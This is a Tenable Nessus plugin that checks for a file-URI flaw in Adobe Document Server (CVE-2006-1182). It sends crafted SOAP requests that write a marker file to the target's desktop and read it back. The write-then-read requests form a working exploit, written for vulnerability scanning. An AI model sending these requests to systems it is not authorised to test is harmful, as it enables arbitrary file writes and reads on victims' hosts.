#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is affected by multiple flaws. 

Description :

The remote host is running Adobe Document Server, a server that
dynamically creates and manipulates PDF documents as well as graphic
images. 

The version of Adobe Document Server installed on the remote host
allows saving PDF and XML documents as well as most types of image
files using file URIs to arbitrary locations on the affected host and
with arbitrary extensions.  An unauthenticated remote attacker may be
able to leverage this flaw to write a graphics image with malicious
Javascript as metadata into the Startup folders to be executed
whenever a user logs in. 

Additionally, it lets an attacker retrieve arbitrary PDF files, XML
documents, and most types of image files, which may result in the
disclosure of sensitive information. 

See also :

http://secunia.com/secunia_research/2005-28/advisory/
http://www.adobe.com/support/techdocs/332989.html

Solution :

Harden the application's configuration as described in the
'server/tools/security/readme.txt' file included in the distribution
as well as the vendor advisory above. 

Risk factor :

Low / CVSS Base Score : 2.5
(AV:L/AC:H/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21100);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1182");
  script_bugtraq_id(17113);
  script_xref(name:"OSVDB", value:"23924");

  script_name(english:"Adobe Document Server File URI Resource Access Vulnerability");
  script_summary(english:"Tries to write to a file using Adobe Document Server");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8019);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:8019);
if (!get_port_state(port)) exit(0);


# Check whether the script exists.
req = http_get(item:"/altercast/AlterCast", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# If it does...
if ("<title>Adobe Server Web Services" >< res)
{
  # Exploit data.
  magic = string(SCRIPT_NAME, " created this file at ", unixtime());
  file = string("C:/Documents and Settings/All Users/Desktop/NESSUS-README.xml");

  # Write to a file.
  postdata = string(
    '<?xml version="1.0" encoding="utf-8"?>\n',
    "<soap:Envelope\n",
    '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n',
    '    xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n',
    '    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
    "  <soap:Body>\n",
    '    <request xmlns="http://ns.adobe.com/altercast/1.5/">\n',
    "     <commands>\n",
    "       &lt;commands&gt;\n",
    "         &lt;loadContent source=&quot;nessus&quot; /&gt;\n",
    "         &lt;saveContent name=&quot;file:///", file, "&quot; /&gt;\n",
    "       &lt;/commands&gt;\n",
    "     </commands>\n",
    "     <files>\n",
    "       <file>\n",
    "         <name>nessus</name>\n",
    "         <data>", base64(str:string("<nessus>", magic, "</nessus>")), "</data>\n",
    "       </file>\n",
    "     </files>\n",
    "    </request>\n",
    "  </soap:Body>\n",
    "</soap:Envelope>\n"
  );
  req = string(
    "POST /altercast/AlterCast HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Type: text/xml; charset=utf-8\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    'SOAPAction: "http://ns.adobe.com/altercast/1.5/Execute"\r\n',
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # Read the file back.
  postdata = string(
    '<?xml version="1.0" encoding="utf-8"?>\n',
    "<soap:Envelope\n",
    '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n',
    '    xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n',
    '    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
    "  <soap:Body>\n",
    '    <request xmlns="http://ns.adobe.com/altercast/1.5/">\n',
    "     <commands>\n",
    "       &lt;commands&gt;\n",
    "         &lt;loadContent source=&quot;file:///", file, "&quot; /&gt;\n",
    "       &lt;/commands&gt;\n",
    "     </commands>\n",
    "    </request>\n",
    "  </soap:Body>\n",
    "</soap:Envelope>\n"
  );
  req = string(
    "POST /altercast/AlterCast HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Type: text/xml; charset=utf-8\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    'SOAPAction: "http://ns.adobe.com/altercast/1.5/Execute"\r\n',
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If the response has a SOAP body...
  if ("<soap:Body>" >< res)
  {
    # Extract and decode the data.
    data = strstr(res, "<data>");
    if (data) data = data - "<data>";
    if (data) data = data - strstr(data, "</data>");
    if (data)
    {
      contents = base64_decode(str:data);

      # There's a problem if our magic string is in the contents.
      if (magic >< contents)
      {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to write to the following file on the remote host :\n",
          "\n",
          "  ", file
        );
        security_note(port:port, data:report);
      }
    }
  }
}
